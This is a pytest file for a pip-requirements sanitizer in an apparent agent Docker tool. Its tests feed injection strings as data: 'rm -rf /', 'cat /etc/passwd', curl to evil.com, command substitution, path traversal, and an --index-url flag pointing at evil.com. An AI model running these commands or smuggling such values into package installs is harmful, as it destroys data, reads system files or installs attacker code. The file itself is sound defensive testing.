"""Tests for sanitize_requirements — pip package validation."""

import pytest

from backend.agno.tools.docker_exec import sanitize_requirements


class TestSanitizeRequirements:
    # --- Valid inputs ---

    def test_simple_package(self):
        assert sanitize_requirements("numpy") == "numpy"

    def test_multiple_packages(self):
        assert sanitize_requirements("numpy pandas scipy") == "numpy pandas scipy"

    def test_versioned_package(self):
        assert sanitize_requirements("numpy>=1.24.0") == "numpy>=1.24.0"

    def test_exact_version(self):
        assert sanitize_requirements("scikit-learn==1.3.0") == "scikit-learn==1.3.0"

    def test_package_with_extras(self):
        assert sanitize_requirements("uvicorn[standard]") == "uvicorn[standard]"

    def test_mixed_valid(self):
        result = sanitize_requirements("numpy>=2.0 pandas scikit-learn==1.3")
        assert result == "numpy>=2.0 pandas scikit-learn==1.3"

    def test_empty_string(self):
        assert sanitize_requirements("") == ""

    def test_whitespace_only(self):
        assert sanitize_requirements("   ") == ""

    # --- Shell injection attempts ---

    def test_semicolon_injection(self):
        with pytest.raises(ValueError, match="shell metacharacters"):
            sanitize_requirements("numpy; rm -rf /")

    def test_pipe_injection(self):
        with pytest.raises(ValueError, match="shell metacharacters"):
            sanitize_requirements("numpy | cat /etc/passwd")

    def test_ampersand_injection(self):
        with pytest.raises(ValueError, match="shell metacharacters"):
            sanitize_requirements("numpy && curl evil.com")

    def test_dollar_injection(self):
        with pytest.raises(ValueError, match="shell metacharacters"):
            sanitize_requirements("numpy $(whoami)")

    def test_backtick_injection(self):
        with pytest.raises(ValueError, match="shell metacharacters"):
            sanitize_requirements("numpy `whoami`")

    def test_newline_injection(self):
        with pytest.raises(ValueError, match="shell metacharacters"):
            sanitize_requirements("numpy\nwhoami")

    # --- Invalid package names ---

    def test_path_traversal(self):
        with pytest.raises(ValueError, match="Invalid package specifier"):
            sanitize_requirements("../../etc/passwd")

    def test_url_as_package(self):
        with pytest.raises(ValueError, match="Invalid package specifier"):
            sanitize_requirements("https://evil.com/package.tar.gz")

    def test_flag_injection(self):
        with pytest.raises(ValueError, match="Invalid package specifier"):
            sanitize_requirements("--index-url=http://evil.com numpy")
